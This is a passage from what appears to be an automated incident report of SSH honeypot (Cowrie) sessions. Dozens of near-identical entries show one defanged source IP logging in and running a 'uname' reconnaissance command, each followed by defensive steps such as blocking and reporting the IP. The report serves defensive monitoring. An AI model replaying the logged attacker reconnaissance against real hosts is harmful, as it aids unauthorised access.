- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-191fb41b1f51

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:03 |
| **Last Seen** | 2026-07-28 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:03:56` | `cowrie.session.connect` |
| `2026-07-28 05:03:56` | `cowrie.client.version` |
| `2026-07-28 05:03:56` | `cowrie.client.kex` |
| `2026-07-28 05:03:57` | `cowrie.login.success` |
| `2026-07-28 05:03:57` | `cowrie.session.params` |
| `2026-07-28 05:03:57` | `cowrie.command.input` |
| `2026-07-28 05:03:57` | `cowrie.log.closed` |
| `2026-07-28 05:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b2bb9dc5a23

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:01` | `cowrie.session.connect` |
| `2026-07-28 05:04:01` | `cowrie.client.version` |
| `2026-07-28 05:04:01` | `cowrie.client.kex` |
| `2026-07-28 05:04:02` | `cowrie.login.success` |
| `2026-07-28 05:04:04` | `cowrie.session.params` |
| `2026-07-28 05:04:04` | `cowrie.command.input` |
| `2026-07-28 05:04:04` | `cowrie.log.closed` |
| `2026-07-28 05:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad80b79fb4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:08` | `cowrie.session.connect` |
| `2026-07-28 05:04:08` | `cowrie.client.version` |
| `2026-07-28 05:04:08` | `cowrie.client.kex` |
| `2026-07-28 05:04:09` | `cowrie.login.success` |
| `2026-07-28 05:04:09` | `cowrie.session.params` |
| `2026-07-28 05:04:09` | `cowrie.command.input` |
| `2026-07-28 05:04:09` | `cowrie.log.closed` |
| `2026-07-28 05:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b9fa194bc1a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:14` | `cowrie.session.connect` |
| `2026-07-28 05:04:14` | `cowrie.client.version` |
| `2026-07-28 05:04:14` | `cowrie.client.kex` |
| `2026-07-28 05:04:14` | `cowrie.login.success` |
| `2026-07-28 05:04:15` | `cowrie.session.params` |
| `2026-07-28 05:04:15` | `cowrie.command.input` |
| `2026-07-28 05:04:15` | `cowrie.log.closed` |
| `2026-07-28 05:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dd182919360

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:20` | `cowrie.session.connect` |
| `2026-07-28 05:04:20` | `cowrie.client.version` |
| `2026-07-28 05:04:20` | `cowrie.client.kex` |
| `2026-07-28 05:04:21` | `cowrie.login.success` |
| `2026-07-28 05:04:22` | `cowrie.session.params` |
| `2026-07-28 05:04:22` | `cowrie.command.input` |
| `2026-07-28 05:04:22` | `cowrie.log.closed` |
| `2026-07-28 05:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-031ae34a50d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:26` | `cowrie.session.connect` |
| `2026-07-28 05:04:26` | `cowrie.client.version` |
| `2026-07-28 05:04:26` | `cowrie.client.kex` |
| `2026-07-28 05:04:27` | `cowrie.login.success` |
| `2026-07-28 05:04:28` | `cowrie.session.params` |
| `2026-07-28 05:04:28` | `cowrie.command.input` |
| `2026-07-28 05:04:28` | `cowrie.log.closed` |
| `2026-07-28 05:04:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a774ad2b13

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:32` | `cowrie.session.connect` |
| `2026-07-28 05:04:32` | `cowrie.client.version` |
| `2026-07-28 05:04:32` | `cowrie.client.kex` |
| `2026-07-28 05:04:33` | `cowrie.login.success` |
| `2026-07-28 05:04:34` | `cowrie.session.params` |
| `2026-07-28 05:04:34` | `cowrie.command.input` |
| `2026-07-28 05:04:34` | `cowrie.log.closed` |
| `2026-07-28 05:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0c072e7d0d9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:38` | `cowrie.session.connect` |
| `2026-07-28 05:04:38` | `cowrie.client.version` |
| `2026-07-28 05:04:38` | `cowrie.client.kex` |
| `2026-07-28 05:04:39` | `cowrie.login.success` |
| `2026-07-28 05:04:40` | `cowrie.session.params` |
| `2026-07-28 05:04:40` | `cowrie.command.input` |
| `2026-07-28 05:04:40` | `cowrie.log.closed` |
| `2026-07-28 05:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72bf07b7dd9c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:45` | `cowrie.session.connect` |
| `2026-07-28 05:04:45` | `cowrie.client.version` |
| `2026-07-28 05:04:45` | `cowrie.client.kex` |
| `2026-07-28 05:04:46` | `cowrie.login.success` |
| `2026-07-28 05:04:47` | `cowrie.session.params` |
| `2026-07-28 05:04:47` | `cowrie.command.input` |
| `2026-07-28 05:04:47` | `cowrie.log.closed` |
| `2026-07-28 05:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfc33c883e25

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:51` | `cowrie.session.connect` |
| `2026-07-28 05:04:51` | `cowrie.client.version` |
| `2026-07-28 05:04:51` | `cowrie.client.kex` |
| `2026-07-28 05:04:52` | `cowrie.login.success` |
| `2026-07-28 05:04:53` | `cowrie.session.params` |
| `2026-07-28 05:04:53` | `cowrie.command.input` |
| `2026-07-28 05:04:53` | `cowrie.log.closed` |
| `2026-07-28 05:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ff9502e14f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:04 |
| **Last Seen** | 2026-07-28 05:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:04:57` | `cowrie.session.connect` |
| `2026-07-28 05:04:57` | `cowrie.client.version` |
| `2026-07-28 05:04:57` | `cowrie.client.kex` |
| `2026-07-28 05:04:58` | `cowrie.login.success` |
| `2026-07-28 05:04:59` | `cowrie.session.params` |
| `2026-07-28 05:04:59` | `cowrie.command.input` |
| `2026-07-28 05:04:59` | `cowrie.log.closed` |
| `2026-07-28 05:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d2b6b71d1b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:04` | `cowrie.session.connect` |
| `2026-07-28 05:05:04` | `cowrie.client.version` |
| `2026-07-28 05:05:04` | `cowrie.client.kex` |
| `2026-07-28 05:05:04` | `cowrie.login.success` |
| `2026-07-28 05:05:05` | `cowrie.session.params` |
| `2026-07-28 05:05:05` | `cowrie.command.input` |
| `2026-07-28 05:05:05` | `cowrie.log.closed` |
| `2026-07-28 05:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7208986d7811

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:09` | `cowrie.session.connect` |
| `2026-07-28 05:05:10` | `cowrie.client.version` |
| `2026-07-28 05:05:10` | `cowrie.client.kex` |
| `2026-07-28 05:05:10` | `cowrie.login.success` |
| `2026-07-28 05:05:11` | `cowrie.session.params` |
| `2026-07-28 05:05:11` | `cowrie.command.input` |
| `2026-07-28 05:05:11` | `cowrie.log.closed` |
| `2026-07-28 05:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d8e5aa8cad6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:15` | `cowrie.session.connect` |
| `2026-07-28 05:05:16` | `cowrie.client.version` |
| `2026-07-28 05:05:16` | `cowrie.client.kex` |
| `2026-07-28 05:05:16` | `cowrie.login.success` |
| `2026-07-28 05:05:17` | `cowrie.session.params` |
| `2026-07-28 05:05:17` | `cowrie.command.input` |
| `2026-07-28 05:05:17` | `cowrie.log.closed` |
| `2026-07-28 05:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04aab611c609

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:21` | `cowrie.session.connect` |
| `2026-07-28 05:05:21` | `cowrie.client.version` |
| `2026-07-28 05:05:21` | `cowrie.client.kex` |
| `2026-07-28 05:05:22` | `cowrie.login.success` |
| `2026-07-28 05:05:22` | `cowrie.session.params` |
| `2026-07-28 05:05:22` | `cowrie.command.input` |
| `2026-07-28 05:05:23` | `cowrie.log.closed` |
| `2026-07-28 05:05:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98e7154084d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:28` | `cowrie.session.connect` |
| `2026-07-28 05:05:28` | `cowrie.client.version` |
| `2026-07-28 05:05:28` | `cowrie.client.kex` |
| `2026-07-28 05:05:29` | `cowrie.login.success` |
| `2026-07-28 05:05:29` | `cowrie.session.params` |
| `2026-07-28 05:05:29` | `cowrie.command.input` |
| `2026-07-28 05:05:31` | `cowrie.log.closed` |
| `2026-07-28 05:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-335dfccbcba7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:34` | `cowrie.session.connect` |
| `2026-07-28 05:05:34` | `cowrie.client.version` |
| `2026-07-28 05:05:34` | `cowrie.client.kex` |
| `2026-07-28 05:05:35` | `cowrie.login.success` |
| `2026-07-28 05:05:36` | `cowrie.session.params` |
| `2026-07-28 05:05:36` | `cowrie.command.input` |
| `2026-07-28 05:05:36` | `cowrie.log.closed` |
| `2026-07-28 05:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56c1586f5f45

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:39` | `cowrie.session.connect` |
| `2026-07-28 05:05:40` | `cowrie.client.version` |
| `2026-07-28 05:05:40` | `cowrie.client.kex` |
| `2026-07-28 05:05:42` | `cowrie.login.success` |
| `2026-07-28 05:05:43` | `cowrie.session.params` |
| `2026-07-28 05:05:43` | `cowrie.command.input` |
| `2026-07-28 05:05:44` | `cowrie.log.closed` |
| `2026-07-28 05:05:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5842d81d704b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:45` | `cowrie.session.connect` |
| `2026-07-28 05:05:46` | `cowrie.client.version` |
| `2026-07-28 05:05:46` | `cowrie.client.kex` |
| `2026-07-28 05:05:47` | `cowrie.login.success` |
| `2026-07-28 05:05:48` | `cowrie.session.params` |
| `2026-07-28 05:05:48` | `cowrie.command.input` |
| `2026-07-28 05:05:48` | `cowrie.log.closed` |
| `2026-07-28 05:05:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f86332a1d85

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:51` | `cowrie.session.connect` |
| `2026-07-28 05:05:51` | `cowrie.client.version` |
| `2026-07-28 05:05:52` | `cowrie.client.kex` |
| `2026-07-28 05:05:52` | `cowrie.login.success` |
| `2026-07-28 05:05:53` | `cowrie.session.params` |
| `2026-07-28 05:05:53` | `cowrie.command.input` |
| `2026-07-28 05:05:53` | `cowrie.log.closed` |
| `2026-07-28 05:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a545ce712eb8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:05 |
| **Last Seen** | 2026-07-28 05:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:05:57` | `cowrie.session.connect` |
| `2026-07-28 05:05:57` | `cowrie.client.version` |
| `2026-07-28 05:05:57` | `cowrie.client.kex` |
| `2026-07-28 05:05:58` | `cowrie.login.success` |
| `2026-07-28 05:05:59` | `cowrie.session.params` |
| `2026-07-28 05:05:59` | `cowrie.command.input` |
| `2026-07-28 05:05:59` | `cowrie.log.closed` |
| `2026-07-28 05:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e35c7da9a1b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:03` | `cowrie.session.connect` |
| `2026-07-28 05:06:03` | `cowrie.client.version` |
| `2026-07-28 05:06:03` | `cowrie.client.kex` |
| `2026-07-28 05:06:03` | `cowrie.login.success` |
| `2026-07-28 05:06:04` | `cowrie.session.params` |
| `2026-07-28 05:06:04` | `cowrie.command.input` |
| `2026-07-28 05:06:04` | `cowrie.log.closed` |
| `2026-07-28 05:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7053c1a7902

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:08` | `cowrie.session.connect` |
| `2026-07-28 05:06:08` | `cowrie.client.version` |
| `2026-07-28 05:06:08` | `cowrie.client.kex` |
| `2026-07-28 05:06:09` | `cowrie.login.success` |
| `2026-07-28 05:06:10` | `cowrie.session.params` |
| `2026-07-28 05:06:10` | `cowrie.command.input` |
| `2026-07-28 05:06:11` | `cowrie.log.closed` |
| `2026-07-28 05:06:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff715b5c3e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:14` | `cowrie.session.connect` |
| `2026-07-28 05:06:14` | `cowrie.client.version` |
| `2026-07-28 05:06:14` | `cowrie.client.kex` |
| `2026-07-28 05:06:14` | `cowrie.login.success` |
| `2026-07-28 05:06:15` | `cowrie.session.params` |
| `2026-07-28 05:06:15` | `cowrie.command.input` |
| `2026-07-28 05:06:16` | `cowrie.log.closed` |
| `2026-07-28 05:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a523355395

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:19` | `cowrie.session.connect` |
| `2026-07-28 05:06:19` | `cowrie.client.version` |
| `2026-07-28 05:06:19` | `cowrie.client.kex` |
| `2026-07-28 05:06:21` | `cowrie.login.success` |
| `2026-07-28 05:06:22` | `cowrie.session.params` |
| `2026-07-28 05:06:22` | `cowrie.command.input` |
| `2026-07-28 05:06:22` | `cowrie.log.closed` |
| `2026-07-28 05:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b10b08d4dfe7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:24` | `cowrie.session.connect` |
| `2026-07-28 05:06:25` | `cowrie.client.version` |
| `2026-07-28 05:06:25` | `cowrie.client.kex` |
